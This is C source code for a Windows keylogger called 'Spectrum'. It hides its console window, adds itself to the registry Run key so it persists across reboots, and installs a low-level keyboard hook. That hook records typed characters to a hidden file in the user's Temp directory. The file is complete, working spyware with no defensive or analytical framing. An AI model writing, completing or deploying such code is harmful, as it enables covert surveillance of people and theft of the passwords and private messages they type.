#include "spectrum.h"

HHOOK hhook = NULL;
int charCount = 0;

int
main(void)
{
	const HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);

	ensure_startup();
	
	initialize_log();

	if(set_hook() != 0)
		exit(1);
	
	MSG msg;

	while(GetMessageA(&msg, NULL, 0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	if(release_hook() != 0)
		return -1;

	return 0;
}

void
initialize_log(void)
{
	FILE *fp;
	char profile[MAX_PATH];
	char* buf = NULL;
	size_t sz = 0;

	_dupenv_s(&buf, &sz, "USERPROFILE");

	char* temp  = "\\AppData\\Local\\Temp\\idx";
	
	strcpy_s(profile, strlen(buf) +1, buf);
	strcat_s(profile, sizeof(profile), temp);
	strcat_s(profile, sizeof(profile), "\0");

	free(buf);
	
	const errno_t err = fopen_s(&fp, profile, "a+");

	if(err != 0 || fp == NULL)
	{
		exit(1);
	}
		
	time_t t = time(NULL);
	struct tm tm;
	localtime_s(&tm, &t);

	fprintf(fp, "\n\n%d-%d-%d %d:%d:%d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
	fclose(fp);
	
	DWORD attributes = GetFileAttributesA(profile);
	SetFileAttributesA(profile, attributes + FILE_ATTRIBUTE_HIDDEN);
}

int
set_hook()
{
	hhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) log_process, GetModuleHandle(NULL), 0);
	return hhook == NULL;
}


LRESULT
log_process(int nCode, WPARAM wparam, LPARAM lparam)
{
	FILE *fp;
	char profile[MAX_PATH];
	char* buf = NULL;
	size_t sz = 0;

	_dupenv_s(&buf, &sz, "USERPROFILE");

	char* temp  = "\\AppData\\Local\\Temp\\idx";
	
	strcpy_s(profile, strlen(buf) +1, buf);
	strcat_s(profile, sizeof(profile), temp);
	strcat_s(profile, sizeof(profile), "\0");

	free(buf);
	
	const errno_t err = fopen_s(&fp,profile, "a+");
	if(err != 0 || fp == NULL)
	{
		exit(1);
	}

	if(nCode < 0)
		CallNextHookEx(hhook, nCode, wparam, lparam);

	KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*) lparam;
	if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		if(kb->vkCode >= 0x30 && kb->vkCode <= 0x5A)
		{
			char c = (char) kb->vkCode;
			fprintf(fp, "%c", c);
		}
		else
		{
			switch (kb->vkCode)
            {
                case VK_RETURN:
                    fprintf(fp, "\n");
                    // Reset character counter when user enters new line
                    charCount = 0;
                    break;
                case VK_SPACE:
                    fprintf(fp, " ");
                    break;
                case VK_OEM_PERIOD:
                    fprintf(fp, ".");
                    break;
                case VK_OEM_COMMA:
                    fprintf(fp, ",");
                    break;
                case VK_OEM_7:
                    fprintf(fp, "'");
                    break;
                default:
                    fprintf(fp, "");
                    break;
            };
		}

		charCount++;
		if(charCount > 80)
		{
			fprintf(fp, "\n");
			charCount = 0;
		}
	}
	
	fclose(fp);

	return CallNextHookEx(hhook, nCode, wparam, lparam);	
}

int
release_hook()
{
	int hhookStatus = UnhookWindowsHookEx(hhook);
	hhook = NULL;
	return hhookStatus;
}

void
ensure_startup()
{
	HKEY hKey;
	LPCSTR lpsName = "Spectrum";
	const char* czSpectrum = "\\spectrum.exe";	
	char cDir[MAX_PATH];
	
	GetCurrentDir(cDir, sizeof(cDir));	
	strcat_s(cDir, sizeof(cDir), czSpectrum);
	strcat_s(cDir, sizeof(cDir), "\0");

	RegOpenKey(HKEY_CURRENT_USER, TEXT(
		  "Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 
		               &hKey);

	RegSetValueExA(hKey, 
							 lpsName,
							0, REG_SZ,
							 (const BYTE*)cDir, sizeof(cDir) + 1);

	RegCloseKey(hKey);


	/*char startup[MAX_PATH];
	char* buf = NULL;
	size_t sz = 0;

	_dupenv_s(&buf, &sz, "USERPROFILE");

	char* temp  = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Spectrum.ink";
	
	strcpy_s(startup, strlen(buf) +1, buf);
	strcat_s(startup, sizeof(startup), temp);
	strcat_s(startup, sizeof(startup), "\0");

	int err = CreateSymbolicLink(cDir, startup ,0);
	DWORD error = GetLastError();*/

	
}